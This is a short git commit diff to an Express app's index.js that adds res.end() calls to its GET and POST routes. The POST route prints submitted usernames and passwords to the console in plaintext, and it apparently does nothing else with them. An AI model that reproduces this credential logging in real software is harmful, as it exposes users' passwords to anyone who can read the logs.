d6743be7132405a2c688c8385ea0401290d7ea79
Josh Wells <40251012+milkbag19@users.noreply.github.com>
2020-06-16 18:27:41 -0400

    Update index.js

--- index.js
+++ index.js
@@ -19,11 +19,13 @@ app.set('view engine', 'ejs');
 app.listen(process.env.PORT || 8888,() => {
     app.get('/',(req, res) => {
         res.render("/app/index");
+        res.end();
     });
 
     app.post('/',(req, res) => {
         console.log(req.body.user);
         console.log(req.body.pass);
+        res.end();
     });
 })
 
